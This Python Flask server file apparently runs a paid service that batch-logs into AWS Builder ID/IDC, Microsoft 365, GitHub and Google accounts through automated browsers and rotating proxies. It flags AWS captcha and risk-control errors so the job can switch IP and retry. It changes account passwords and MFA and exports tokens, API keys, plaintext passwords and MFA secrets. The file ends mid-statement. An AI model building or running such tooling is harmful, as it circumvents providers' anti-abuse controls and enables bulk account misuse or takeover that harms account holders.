from __future__ import annotations

import argparse
import base64
import datetime as dt
import hashlib
import hmac
import io
import json
import logging
import os
import random
import re
import secrets
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from dataclasses import dataclass, field
from logging.handlers import RotatingFileHandler
from pathlib import Path
from typing import Any, Optional

from flask import Flask, jsonify, redirect, render_template, request, send_file, session, url_for
from flask.sessions import SecureCookieSessionInterface
from werkzeug.middleware.proxy_fix import ProxyFix

import builder_id_browser_login as builderid
import device_code_auth as dca
import github_browser_login as githubb
import google_browser_login as googleb
import idc_browser_login as idc
import m365_sso_login as m365
import m365_browser_login as m365b
import mihomo_controller as mihomo
import outlook_otp
from proxy_util import normalize_proxy_url, parse_proxy


def _resource_root() -> Path:
    """Resolve bundled resource root (PyInstaller _MEIPASS) or source dir."""
    base = getattr(sys, "_MEIPASS", None)
    if base:
        return Path(base)
    return Path(__file__).parent


def _runtime_dir() -> Path:
    """Writable dir next to the executable (frozen) or source dir."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent
    return Path(__file__).parent


_RES_ROOT = _resource_root()
app = Flask(
    __name__,
    template_folder=str(_RES_ROOT / "templates"),
    static_folder=str(_RES_ROOT / "static"),
)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
app.config["JSON_AS_ASCII"] = False
SECRET_PATH = _runtime_dir() / ".flask-secret"
if not SECRET_PATH.exists():
    SECRET_PATH.write_text(secrets.token_urlsafe(48), encoding="utf-8")
    SECRET_PATH.chmod(0o600)
app.secret_key = SECRET_PATH.read_text(encoding="utf-8").strip()


def _env_bool(value: str) -> bool | None:
    normalized = (value or "").strip().lower()
    if normalized in {"1", "true", "yes", "on"}:
        return True
    if normalized in {"0", "false", "no", "off"}:
        return False
    return None


class HttpAwareSessionInterface(SecureCookieSessionInterface):
    """Use Secure cookies on HTTPS while still allowing direct HTTP/IP logins."""

    def get_cookie_secure(self, app: Flask) -> bool:
        configured = os.environ.get("KIRO_LOGIN_COOKIE_SECURE", "auto")
        parsed = _env_bool(configured)
        if parsed is not None:
            return parsed
        return request.is_secure


app.session_interface = HttpAwareSessionInterface()
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=dt.timedelta(days=30),
)


@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

JOBS: dict[str, "Job"] = {}
JOBS_LOCK = threading.RLock()
PASSWORD_LEDGER_LOCK = threading.Lock()
# save_job_history 节流：高频的日志行只做「脏标记 + 最多每 N 秒落盘一次」，
# 关键状态变更仍用 force=True 立即落盘保证崩溃安全。
_HISTORY_SAVE_LOCK = threading.Lock()
_HISTORY_LAST_SAVE = 0.0
_HISTORY_DIRTY = False
HISTORY_SAVE_MIN_INTERVAL = 2.0
# 调度器唤醒事件：提交/完成任务后置位，让调度器立即检查是否有可启动的排队任务。
SCHEDULER_WAKE = threading.Event()


def is_captcha_error(msg: str) -> bool:
    """是否是 AWS 人机验证/风控类错误（需换 IP + 等待重试）。

    不含「doesn't quite match our records」：没有 Security check 时那是密码不匹配，
    换 IP 重试同一错误密码只会再触发 captcha。登录函数在看到 Security check 时
    会带上「captcha / 人机验证」前缀，仍走换 IP。
    """
    m = (msg or "").lower()
    return any(k in m for k in (
        "captcha", "验证码", "are you human", "robot",
        "too many", "rate", "风控", "suspicious", "unusual",
        "security check", "security challenge", "人机验证",
        "err-837", "err 837", "issue with your builder id",
    ))


def is_proxy_conn_error(msg: str) -> bool:
    """是否是代理连接失败（瞬时性，重试或换节点即可）。"""
    m = (msg or "").lower()
    return any(k in m for k in (
        "err_proxy_connection_failed", "err_tunnel_connection_failed",
        "err_connection_reset", "err_connection_closed",
        "err_connection_refused", "err_timed_out", "err_connection_timed_out",
        "econnrefused", "socks", "proxy",
        "page.goto", "net::err_", "timeout 15000ms exceeded",
        "timeout 30000ms exceeded", "timeout 45000ms exceeded",
        "timeout 60000ms exceeded", "err_name_not_resolved",
        "err_socks_connection_failed", "ns_error_proxy", "ns_error_net",
        "打开页面超时",
    ))


CUSTOMERS_PATH = Path(__file__).parent / "customers.json"
CUSTOMERS_LOCK = threading.RLock()
HISTORY_PATH = Path(__file__).parent / "data" / "job_history.json"
HISTORY_LIMIT = 120
LOG_DIR = Path(__file__).parent / "logs"
LOG_DIR.mkdir(exist_ok=True)
LOG_DIR.chmod(0o700)
APP_LOG_PATH = LOG_DIR / "app.log"
EXPORT_TTL_SECONDS = 24 * 3600  # 默认账号数据保留时长（默认 24 小时；可被任务级自定义覆盖）
MIN_EXPORT_TTL_SECONDS = 5 * 60  # 自定义保留时长下限：5 分钟
MAX_EXPORT_TTL_SECONDS = 7 * 24 * 3600  # 自定义保留时长上限：7 天
CLEANUP_INTERVAL_SECONDS = 30
MAX_ACCOUNTS_PER_JOB = 50
MAX_ACTIVE_JOBS_PER_CUSTOMER = 2
MAX_ACTIVE_JOBS_GLOBAL = 8
MAX_THREADS_PER_JOB = 10
MAX_BROWSER_SLOTS_GLOBAL = 20
DEFAULT_FAILURE_WAIT_SECONDS = 60
MIN_FAILURE_WAIT_SECONDS = 5
MAX_FAILURE_WAIT_SECONDS = 3600
DEFAULT_TOKEN_WAIT_SECONDS = 60
MIN_TOKEN_WAIT_SECONDS = 5
MAX_TOKEN_WAIT_SECONDS = 600
# 排队容量：超过并发上限的任务不再直接 429 拒绝，而是进队等待调度。
# 仅对「排队+运行」总数设上限，防止内存滥用/滥提交。
MAX_QUEUED_JOBS_PER_CUSTOMER = 6
MAX_TOTAL_JOBS_GLOBAL = 60
SCHEDULER_INTERVAL_SECONDS = 2
# M365/SSO 回环端口池：每个并发登录占一个端口（避免写死 3128 导致并发冲突）。
# 全局上限 MAX_BROWSER_SLOTS_GLOBAL(20) 已限制总浏览器并发，端口区间留足余量。
M365_PORT_BASE = 3130
M365_PORT_RANGE = 60
M365_PORT_LOCK = threading.Lock()
M365_PORTS_IN_USE: set[int] = set()


def acquire_m365_port() -> int:
    """从端口池分配一个空闲回环端口；用完务必 release。"""
    with M365_PORT_LOCK:
        for offset in range(M365_PORT_RANGE):
            port = M365_PORT_BASE + offset
            if port not in M365_PORTS_IN_USE:
                M365_PORTS_IN_USE.add(port)
                return port
    raise RuntimeError("M365 回环端口池已耗尽（并发过高）")


def release_m365_port(port: int) -> None:
    with M365_PORT_LOCK:
        M365_PORTS_IN_USE.discard(port)
DEFAULT_START_URL = idc.DEFAULT_IDC_START_URL
DEFAULT_NEW_PASSWORD = idc.DEFAULT_NEW_PASSWORD
KIRO_SOCIAL_PROFILE_ARN = "arn:aws:codewhisperer:us-east-1:699475941385:profile/EHGA3GRVQMUK"
KIRO_BUILDER_ID_PROFILE_ARN = "arn:aws:codewhisperer:us-east-1:638616132270:profile/AAAACCCCXXXX"
STUDENT_LOGIN_MODES = {"student", "builder-id", "builder_id", "builderid"}
PROFILE_SCAN_REGIONS = ("us-east-1", "eu-central-1")
ACCOUNT_SEP_RE = re.compile(r"[\t,;|]")
AWS_BLOCK_FIELD_RE = re.compile(r"^\s*([^:：]+)[:：]\s*(.*)\s*$", re.M)
# 单行带标签格式：username: xxx password: yyy（password 取到行尾，保留特殊字符）
INLINE_USER_PASS_RE = re.compile(
    r"^\s*(?:user(?:name)?|account|email)\s*[:：=]\s*(\S+)\s+pass(?:word)?\s*[:：=]\s*(.+?)\s*$",
    re.I,
)
# 块格式：login = xxx / onetime password = yyy （账号与密码间用 " / " 分隔；密码可含特殊字符及无空格的 /）
LOGIN_ONETIME_RE = re.compile(
    r"^\s*login\s*=\s*(.+?)\s+/\s+(?:one[\s-]*time\s*password|onetime\s*password|otp|password)\s*=\s*(.+?)\s*$",
    re.I,
)
# 块格式中的 2FA 行：2fa验 XXXX / 2fa: XXXX / mfa = XXXX 等
BLOCK_2FA_RE = re.compile(
    r"^\s*(?:2fa|mfa|totp)\S*\s*[:=]?\s*([A-Za-z2-7][A-Za-z2-7\s-]+)\s*$",
    re.I,
)
# 简化无标签格式：账号 / 密码（单个 " / " 分隔，账号无空格，密码取到行尾、可含 /）
SIMPLE_SLASH_RE = re.compile(r"^\s*(\S+)\s+/\s+(.+?)\s*$")
KIRO_PROFILE_API_VERSION = "0.12.333"
BLOCKED_PROXY_HOSTS = ("127.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.30.", "172.31.", "192.168.", "localhost", "0.0.0.0", "::1")
# 服务端可信默认代理（管理员通过 env 配置）：套给所有未单独指定代理的账号。
# 与用户输入的代理池不同：这是管理员自己配的，允许回环地址（如本机 mihomo 127.0.0.1:7890），
# 绕过 SSRF 回环黑名单（黑名单只防用户乱填内网地址）。例：http://127.0.0.1:7890
DEFAULT_PROXY = (os.environ.get("KIRO_DEFAULT_PROXY", "") or "").strip()

logger = logging.getLogger("kiro-login-web")
logger.setLevel(logging.INFO)
if not logger.handlers:
    file_handler = RotatingFileHandler(APP_LOG_PATH, maxBytes=2_000_000, backupCount=5, encoding="utf-8")
    file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(file_handler)
    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(stream_handler)

# 降噪：werkzeug 默认把每个 HTTP 请求（含前端每 1.5~5s 的 /api/history、/api/jobs 轮询）都写访问日志，
# 导致 server.log 迅速膨胀（曾达 23MB / 38 万行，其中 15%+ 是 history 轮询）。
# 改为只记 WARNING 及以上（错误/异常仍保留），业务事件走上方自定义 logger（app.log，带轮转）。
logging.getLogger("werkzeug").setLevel(logging.WARNING)


def client_ip() -> str:
    forwarded = request.headers.get("X-Forwarded-For", "") if request else ""
    return (forwarded.split(",")[0].strip() or request.remote_addr or "-") if request else "-"


def audit(event: str, **fields: Any) -> None:
    safe_fields = {k: v for k, v in fields.items() if v is not None}
    logger.info("%s %s", event, json.dumps(safe_fields, ensure_ascii=False, sort_keys=True))


from urllib.parse import urlparse

@app.before_request
def reject_cross_site_posts():
    if request.method not in {"POST", "PUT", "PATCH", "DELETE"}:
        return None
    origin = request.headers.get("Origin")
    if origin:
        try:
            origin_host = urlparse(origin).netloc.lower()
        except Exception:
            origin_host = ""
        request_host = (request.headers.get("X-Forwarded-Host") or request.host or "").lower()
        if origin_host != request_host:
            audit("security.blocked_origin", origin=origin, host=request_host, ip=client_ip())
            return jsonify({"error": "非法来源"}), 403
    return None


def password_hash(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def secure_password_hash(password: str, salt: bytes | None = None) -> str:
    salt = salt or secrets.token_bytes(16)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 200_000)
    return "pbkdf2_sha256$200000$%s$%s" % (
        base64.urlsafe_b64encode(salt).decode().rstrip("="),
        base64.urlsafe_b64encode(digest).decode().rstrip("="),
    )


def verify_password(password: str, stored: str) -> bool:
    if stored.startswith("pbkdf2_sha256$"):
        try:
            _, rounds, salt_b64, digest_b64 = stored.split("$", 3)
            salt = base64.urlsafe_b64decode(salt_b64 + "=" * (-len(salt_b64) % 4))
            expected = base64.urlsafe_b64decode(digest_b64 + "=" * (-len(digest_b64) % 4))
            actual = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, int(rounds))
            return hmac.compare_digest(actual, expected)
        except Exception:
            return False
    return hmac.compare_digest(password_hash(password), stored)


def _lookup_hmac_key() -> bytes:
    """从 Flask secret 派生一个稳定的 HMAC 密钥，专用于客户密码查找索引。
    不新增磁盘文件；只要 Flask secret 不变，lookupHash 就稳定。若 secret 重生（探不到），后续登录会回退到慢路径并重写新 hash，自愈。"""
    return hmac.new(
        (app.secret_key or "").encode("utf-8"),
        b"kiro-login-web:customer-lookup:v1",
        hashlib.sha256,
    ).digest()


def compute_lookup_hash(password: str) -> str:
    """对密码算确定性查找哈希。相同密码总得到同一个 hash；不同密码基本不碰撞。相同密码的多个客户会共享同一 lookupHash，登录时在这个小子集内再跑 PBKDF2 即可。"""
    return hmac.new(_lookup_hmac_key(), password.encode("utf-8"), hashlib.sha256).hexdigest()


def migrate_customer_password_hash(customer_id: str, password: str) -> None:
    """补写无 PBKDF2 旧 hash 的客户；同时回写登录查找索引 lookupHash。
    两个字段任一缺失就会补写，完全齐备则 no-op（避免无谓磁盘写入）。"""
    raw = read_customers_raw()
    item = raw.get(customer_id)
    if not item:
        return
    changed = False
    if not str(item.get("passwordHash", "")).startswith("pbkdf2_sha256$"):
        item["passwordHash"] = secure_password_hash(password)
        item.pop("password", None)
        changed = True
    # lookupHash 缺失或陈旧（Flask secret 旋转后旧 hash 不再匹配）都重写，保证下次走快路径。
    expected_lookup = compute_lookup_hash(password)
    if item.get("lookupHash") != expected_lookup:
        item["lookupHash"] = expected_lookup
        changed = True
    if changed:
        save_customers_raw(raw)


def load_customers() -> dict[str, dict[str, str]]:
    with CUSTOMERS_LOCK:
        if not CUSTOMERS_PATH.exists():
            default_password = secrets.token_urlsafe(10)
            CUSTOMERS_PATH.write_text(
                json.dumps(
                    {
                        "default": {
                            "name": "默认客户",
                            "passwordHash": secure_password_hash(default_password),
                        }
                    },
                    ensure_ascii=False,
                    indent=2,
                ),
                encoding="utf-8",
            )
            CUSTOMERS_PATH.chmod(0o600)
            print(f"[kiro-login-web] 已生成默认客户密码：{default_password}")
            logger.warning("created_default_customer password_written_to=%s", CUSTOMERS_PATH)
        raw = json.loads(CUSTOMERS_PATH.read_text(encoding="utf-8"))
    customers: dict[str, dict[str, str]] = {}
    for customer_id, item in raw.items():
        password = item.get("password", "")
        hashed = item.get("passwordHash") or (password_hash(password) if password else "")
        if not hashed:
            continue
        customers[customer_id] = {
            "id": customer_id,
            "name": item.get("name") or customer_id,
            "passwordHash": hashed,
            "lookupHash": item.get("lookupHash", "") or "",
        }
    return customers


def read_customers_raw() -> dict[str, Any]:
    with CUSTOMERS_LOCK:
        if not CUSTOMERS_PATH.exists():
            load_customers()
        return json.loads(CUSTOMERS_PATH.read_text(encoding="utf-8"))


def save_customers_raw(raw: dict[str, Any]) -> None:
    with CUSTOMERS_LOCK:
        CUSTOMERS_PATH.write_text(json.dumps(raw, ensure_ascii=False, indent=2), encoding="utf-8")
        CUSTOMERS_PATH.chmod(0o600)


def create_customer_for_password(password: str, name: str = "") -> dict[str, str]:
    raw = read_customers_raw()
    customer_id = "c_" + secrets.token_hex(6)
    while customer_id in raw:
        customer_id = "c_" + secrets.token_hex(6)
    customer_name = name.strip() or f"客户 {customer_id[-6:]}"
    raw[customer_id] = {
        "name": customer_name,
        "passwordHash": secure_password_hash(password),
        "lookupHash": compute_lookup_hash(password),
        "createdAt": dt.datetime.now(dt.timezone.utc).isoformat(),
    }
    save_customers_raw(raw)
    return {"id": customer_id, "name": customer_name, "passwordHash": raw[customer_id]["passwordHash"]}


def update_customer_name(customer_id: str, name: str) -> str:
    new_name = name.strip()
    if not new_name:
        return load_customers().get(customer_id, {}).get("name", customer_id)
    raw = read_customers_raw()
    if customer_id in raw:
        raw[customer_id]["name"] = new_name
        save_customers_raw(raw)
    return new_name


def load_customer_proxy_pool(customer_id: str) -> str:
    """读取客户已保存的代理池文本（持久化在 customers.json）。不存在返回空串。"""
    if not customer_id:
        return ""
    raw = read_customers_raw()
    val = (raw.get(customer_id) or {}).get("proxyPool", "")
    return val if isinstance(val, str) else ""


def save_customer_proxy_pool(customer_id: str, text: str) -> int:
    """保存客户代理池（每行一个）。只存合法代理，去重；返回保存的代理数量。
    存前先用 parse_proxy_pool 校验/规范化，避免存入非法或重复项。"""
    pool = parse_proxy_pool(text or "")
    normalized = "\n".join(pool)
    with CUSTOMERS_LOCK:
        raw = read_customers_raw()
        if customer_id in raw:
            raw[customer_id]["proxyPool"] = normalized
            save_customers_raw(raw)
    return len(pool)


def valid_custom_password(password: str) -> tuple[bool, str]:
    if len(password) < 8:
        return False, "密码至少 8 位"
    if len(password) > 128:
        return False, "密码过长"
    if not re.search(r"[a-z]", password):
        return False, "密码必须包含小写字母"
    if not re.search(r"[A-Z]", password):
        return False, "密码必须包含大写字母"
    if not re.search(r"\d", password):
        return False, "密码必须包含数字"
    return True, ""


def looks_like_idc_start_url(value: str) -> bool:
    url = (value or "").strip()
    if not url:
        return False
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
    except Exception:
        return False
    if parsed.scheme != "https":
        return False
    host = (parsed.hostname or "").lower()
    if host.endswith(".awsapps.com"):
        return True
    if ".portal." in host and host.endswith(".app.aws"):
        return True
    if re.match(r"^ssoins-[0-9a-f]+\.[a-z0-9-]+\.portal\.amazonaws\.com$", host):
        return True
    return False


def validate_start_url(value: str) -> tuple[bool, str]:
    url = (value or "").strip()
    if not url:
        return False, "IDC Start URL 必填"
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
    except Exception:
        return False, "IDC Start URL 格式不正确"
    if parsed.scheme != "https":
        return False, "IDC Start URL 必须是 https:// 开头"
    # 只校验 AWS IDC/SSO Portal 域名，不要求路径必须包含 /start。
    # 支持：
    # 1. 老 IDC Start URL: *.awsapps.com[/...]
    # 2. 新 SSO Portal URL: *.portal.<region>.app.aws[/...]
    # 3. Portal AmazonAWS URL: ssoins-xxxx.<region>.portal.amazonaws.com[/...]
    if not looks_like_idc_start_url(url):
        return False, "IDC Start URL 域名应为 *.awsapps.com、*.portal.<region>.app.aws 或 ssoins-xxxx.<region>.portal.amazonaws.com"
    return True, url


def customer_for_password(password: str) -> dict[str, str] | None:
    """按密码查找客户。
    快路径（O(1)+）：先用密码的 lookupHash 筛选出候选集子集（很小），再对候选跑 PBKDF2 验证。
    慢路径（回退）：若没有候选（例如老客户未迁移、或 Flask secret 变了），才对未带 lookupHash 的客户全扫。
    成功后都会调 migrate_customer_password_hash 自愈补写 lookupHash，下次进快路径。
    """
    customers = load_customers()
    target = compute_lookup_hash(password)
    # 快路径：同一 lookupHash 可能多个客户共享（相同密码），逐个验证
    for customer in customers.values():
        if customer.get("lookupHash") and hmac.compare_digest(customer["lookupHash"], target):
            if verify_password(password, customer["passwordHash"]):
                migrate_customer_password_hash(customer["id"], password)
                return customer
    # 慢路径：扫描“快路径未命中”的客户。包括无 lookupHash（首次迁移）
    # 与 lookupHash 陈旧者（Flask secret 旋转后旧 hash 不再匹配 target）。
    # 成功后 migrate 会用当前 secret 重写 lookupHash，下次进快路径（自愈）。
    for customer in customers.values():
        lh = customer.get("lookupHash")
        if lh and hmac.compare_digest(lh, target):
            continue  # 已在快路径验证过，不重复
        if verify_password(password, customer["passwordHash"]):
            migrate_customer_password_hash(customer["id"], password)
            return customer
    return None


def current_customer_id() -> str | None:
    return session.get("customer_id")


def current_customer_name() -> str:
    customers = load_customers()
    cid = current_customer_id()
    return customers.get(cid or "", {}).get("name", cid or "")


def _fmt_duration(seconds: int) -> str:
    """把秒数格式化成人读时长（小时/分钟），仅用于日志提示。"""
    s = int(seconds)
    if s % 3600 == 0:
        return f"{s // 3600} 小时"
    if s >= 3600:
        return f"{s / 3600:.1f} 小时"
    return f"{max(1, s // 60)} 分钟"


def sanitize_subscription_url(value: str) -> str:
    """Accept a one-shot Clash/Mihomo subscription URL without persisting it."""
    url = (value or "").strip()
    if not url:
        return ""
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        return ""
    return url


def safe_job_options_for_history(options: dict[str, Any] | None) -> dict[str, Any]:
    """Persist job options without storing subscription tokens or runtime ports."""
    safe = dict(options or {})
    safe.pop("runtime_proxy_pool", None)
    if safe.get("proxy_subscription_url"):
        safe["proxy_subscription_url"] = ""
        safe["proxy_subscription_configured"] = True
    return safe


def job_ttl_seconds(job: "Job") -> int:
    """返回任务实际生效的保留时长：任务级 ttl_seconds>0 则用之，否则回退全局默认。"""
    ttl = int(getattr(job, "ttl_seconds", 0) or 0)
    return ttl if ttl > 0 else EXPORT_TTL_SECONDS


def cleanup_expired_jobs() -> None:
    now = time.time()
    with JOBS_LOCK:
        for job_id in list(JOBS):
            job = JOBS[job_id]
            ttl = job_ttl_seconds(job)
            expired = bool(job.finished_at and now - job.finished_at > ttl)
            for path_attr, event_name in (("export_path", "export.expired_deleted"), ("export_split_zip_path", "export_split.expired_deleted"), ("api_keys_path", "apikeys.expired_deleted"), ("mfa_secrets_path", "mfa.expired_deleted"), ("accounts_pw_path", "accounts_pw.expired_deleted"), ("combined_credentials_path", "combined_credentials.expired_deleted"), ("password_ledger_path", "password_ledger.expired_deleted"), ("security_changes_path", "security_changes.expired_deleted"), ("log_path", "joblog.expired_deleted")):
                path_value = getattr(job, path_attr, "")
                if path_value and expired:
                    try:
                        Path(path_value).unlink(missing_ok=True)
                        audit(event_name, jobId=job.id, customerId=job.customer_id, path=path_value)
                    except Exception:
                        pass
                    setattr(job, path_attr, "")
            if expired and job.status != "expired" and not job.export_path and not job.export_split_zip_path and not job.api_keys_path and not job.mfa_secrets_path and not job.accounts_pw_path and not job.combined_credentials_path and not job.password_ledger_path and not job.security_changes_path and not job.log_path:
                job.status = "expired"
                job.log(f"导出文件已超过保留时长（{_fmt_duration(ttl)}），已自动删除")
            if job.finished_at and now - job.finished_at > ttl * 2:
                JOBS.pop(job_id, None)
                audit("job.evicted", jobId=job.id, customerId=job.customer_id)
    _sweep_orphan_exports(now)
    save_job_history()


def _sweep_orphan_exports(now: float) -> None:
    """目录级兜底：所有导出文件都是 TTL 后即焚的临时产物。
    回收那些未被 job 属性跟踪（如 early changed-passwords / mfa-secrets-early）
    或 job 被逐出内存后残留的文件（含明文密码/MFA 密钥，属隐私敏感）。
    按 mtime 超 TTL 删除；运行中任务文件 mtime 为近期，不会误删。
    每个文件按其归属 job 的实际保留时长判定（文件名尾部含 16 位 job_id）：
    - job 仍在内存 → 用该 job 的 ttl（尊重自定义长保留，不误删）。
    - job 已被逐出/无法解析 → 回退全局默认 EXPORT_TTL_SECONDS（避免明文密码/MFA 孤儿长期滞留）。"""
    try:
        base = Path(__file__).parent / "exports"
        if not base.exists():
            return
        # 预取内存中各 job 的 ttl，避免在锁外反复取锁。
        with JOBS_LOCK:
            job_ttls = {jid: job_ttl_seconds(job) for jid, job in JOBS.items()}
        removed = 0
        for path in base.glob("*/kiro-*"):
            try:
                if not path.is_file():
                    continue
                m = re.search(r"-([0-9a-f]{16})\.[^.]+$", path.name)
                ttl = job_ttls.get(m.group(1)) if m else None
                if ttl is None:
                    ttl = EXPORT_TTL_SECONDS
                if now - path.stat().st_mtime > ttl:
                    path.unlink(missing_ok=True)
                    removed += 1
            except Exception:
                pass
        if removed:
            audit("exports.orphan_swept", count=removed)
        # 清理空的客户子目录（文件均已过期删除后会累积空目录）。
        for d in base.iterdir():
            try:
                if d.is_dir() and not any(d.iterdir()):
                    d.rmdir()
            except Exception:
                pass
    except Exception as exc:
        logger.warning("sweep orphan exports failed: %s", exc)


def account_result_to_dict(result: "AccountResult") -> dict[str, Any]:
    return {
        "idx": result.idx,
        "email": result.email,
        "ok": result.ok,
        "message": result.message,
        "changedPassword": result.changed_password,
        "exportedCount": len(result.exported),
        "apiKeyCount": len(result.api_keys),
        "mfaSecret": result.mfa_secret,
        "finalPassword": result.final_password,
        "changedMfa": result.changed_mfa,
    }


def account_input_to_dict(account: "AccountInput") -> dict[str, str | int]:
    return {
        "idx": account.idx,
        "email": account.email,
        "password": account.password,
        "proxy": account.proxy,
        "mfaSecret": account.mfa_secret,
        "startUrl": account.start_url,
        "region": account.region,
        "mailPassword": account.mail_password,
    }


def account_input_from_dict(item: dict[str, Any], fallback_idx: int) -> "AccountInput":
    return AccountInput(
        idx=int(item.get("idx") or fallback_idx),
        email=str(item.get("email") or ""),
        password=str(item.get("password") or ""),
        proxy=str(item.get("proxy") or ""),
        mfa_secret=str(item.get("mfaSecret") or item.get("mfa_secret") or ""),
        start_url=str(item.get("startUrl") or item.get("start_url") or ""),
        region=str(item.get("region") or ""),
        mail_password=str(item.get("mailPassword") or item.get("mail_password") or ""),
    )


def read_email_secret_file(path: Path) -> dict[str, str]:
    if not path.exists():
        return {}
    passwords: dict[str, str] = {}
    try:
        for line in path.read_text(encoding="utf-8").splitlines():
            email, sep, password = line.partition(":")
            email = email.strip()
            password = password.strip()
            if sep and email and password:
                passwords[email] = password
    except Exception as exc:
        logger.warning("read email secret file failed: path=%s error=%s", path, exc)
    return passwords


def read_early_changed_passwords(job: "Job") -> dict[str, str]:
    """Load passwords saved immediately after a confirmed password change."""
    path = Path(__file__).parent / "exports" / job.customer_id / f"kiro-changed-passwords-{job.id}.txt"
    return read_email_secret_file(path)


def find_customer_saved_secret(customer_id: str, email: str, patterns: tuple[str, ...]) -> str:
    exports_dir = Path(__file__).parent / "exports" / customer_id
    if not email or not exports_dir.exists():
        return ""
    paths: list[Path] = []
    for pattern in patterns:
        paths.extend(path for path in exports_dir.glob(pattern) if path.is_file())
    paths.sort(key=lambda path: path.stat().st_mtime, reverse=True)
    for path in paths:
        value = read_email_secret_file(path).get(email, "")
        if value:
            return value
    return ""


def save_job_history(force: bool = True) -> None:
    """将 job 历史全量序列化落盘。

    force=True（默认）：关键状态变更（结果完成、改密/MFA 落盘、状态切换等），立即写入。
    force=False：高频日志行调用，距上次落盘不足 HISTORY_SAVE_MIN_INTERVAL 秒则跳过。
    （每个 job 已有独立 .txt 日志逐行落盘，job_history.json 里的 logs 仅供前端展示，丢几行无关紧要。）
    """
    global _HISTORY_LAST_SAVE, _HISTORY_DIRTY
    if not force:
        now = time.time()
        with _HISTORY_SAVE_LOCK:
            _HISTORY_DIRTY = True
            if now - _HISTORY_LAST_SAVE < HISTORY_SAVE_MIN_INTERVAL:
                return
            _HISTORY_LAST_SAVE = now
            _HISTORY_DIRTY = False
    else:
        with _HISTORY_SAVE_LOCK:
            _HISTORY_LAST_SAVE = time.time()
            _HISTORY_DIRTY = False
    try:
        HISTORY_PATH.parent.mkdir(parents=True, exist_ok=True)
        now = time.time()
        with JOBS_LOCK:
            jobs = sorted(JOBS.values(), key=lambda item: item.created_at, reverse=True)[:HISTORY_LIMIT]
            data = []
            for job in jobs:
                if job.finished_at and now - job.finished_at > job_ttl_seconds(job) * 2:
                    continue
                data.append({
                    "id": job.id,
                    "customer_id": job.customer_id,
                    "status": job.status,
                    "created_at": job.created_at,
                    "started_at": job.started_at,
                    "finished_at": job.finished_at,
                    "logs": job.logs[-120:],
                    "results": [account_result_to_dict(result) for result in job.results],
                    "export_path": job.export_path,
                    "export_split_zip_path": job.export_split_zip_path,
                    "api_keys_path": job.api_keys_path,
                    "mfa_secrets_path": job.mfa_secrets_path,
                    "accounts_pw_path": job.accounts_pw_path,
                    "combined_credentials_path": job.combined_credentials_path,
                    "password_ledger_path": job.password_ledger_path,
                    "security_changes_path": job.security_changes_path,
                    "log_path": job.log_path,
                    "total": job.total,
                    "threads": job.threads,
                    "kind": job.kind,
                    "ttl_seconds": job.ttl_seconds,
                    "usesBrowser": job.uses_browser,
                    "done": job.done,
                    "ok": job.ok,
                    "failed": job.failed,
                    "error": job.error,
                    "accounts": [account_input_to_dict(account) for account in job.accounts],
                    "options": safe_job_options_for_history(job.options),
                })
        tmp = HISTORY_PATH.with_name(f"{HISTORY_PATH.name}.{os.getpid()}.{threading.get_ident()}.tmp")
        tmp.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
        try:
            tmp.chmod(0o600)
        except Exception:
            pass
        tmp.replace(HISTORY_PATH)
        try:
            HISTORY_PATH.chmod(0o600)
        except Exception:
            pass
    except Exception as exc:
        logger.warning("save job history failed: %s", exc)


def restore_job_history() -> None:
    if not HISTORY_PATH.exists():
        return
    try:
        data = json.loads(HISTORY_PATH.read_text(encoding="utf-8"))
        now = time.time()
        with JOBS_LOCK:
            for item in data:
                finished_at = item.get("finished_at")
                item_ttl = int(item.get("ttl_seconds") or 0) or EXPORT_TTL_SECONDS
                if finished_at and now - float(finished_at) > item_ttl * 2:
                    continue
                status = item.get("status") or "failed"
                if status in {"queued", "running"}:
                    status = "failed"
                job = Job(
                    id=item["id"],
                    customer_id=item["customer_id"],
                    status=status,
                    created_at=float(item.get("created_at") or now),
                    started_at=item.get("started_at"),
                    finished_at=finished_at or now,
                    logs=list(item.get("logs") or []),
                    export_path=item.get("export_path") or "",
                    export_split_zip_path=item.get("export_split_zip_path") or "",
                    api_keys_path=item.get("api_keys_path") or "",
                    mfa_secrets_path=item.get("mfa_secrets_path") or "",
                    accounts_pw_path=item.get("accounts_pw_path") or "",
                    combined_credentials_path=item.get("combined_credentials_path") or "",
                    password_ledger_path=item.get("password_ledger_path") or "",
                    security_changes_path=item.get("security_changes_path") or "",
                    log_path=item.get("log_path") or "",
                    total=int(item.get("total") or 0),
                    threads=int(item.get("threads") or 1),
                    kind=item.get("kind") or "login",
                    ttl_seconds=int(item.get("ttl_seconds") or 0),
                    uses_browser=bool(item.get("usesBrowser", True)),
                    done=int(item.get("done") or 0),
                    ok=int(item.get("ok") or 0),
                    failed=int(item.get("failed") or 0),
                    error=item.get("error") or "",
                )
                for result in item.get("results") or []:
                    job.results.append(AccountResult(
                        int(result.get("idx") or 0),
                        result.get("email") or "",
                        bool(result.get("ok")),
                        result.get("message") or "",
                        bool(result.get("changedPassword")),
                        mfa_secret=result.get("mfaSecret") or "",
                        final_password=result.get("finalPassword") or "",
                        changed_mfa=bool(result.get("changedMfa")),
                    ))
                job.accounts = [
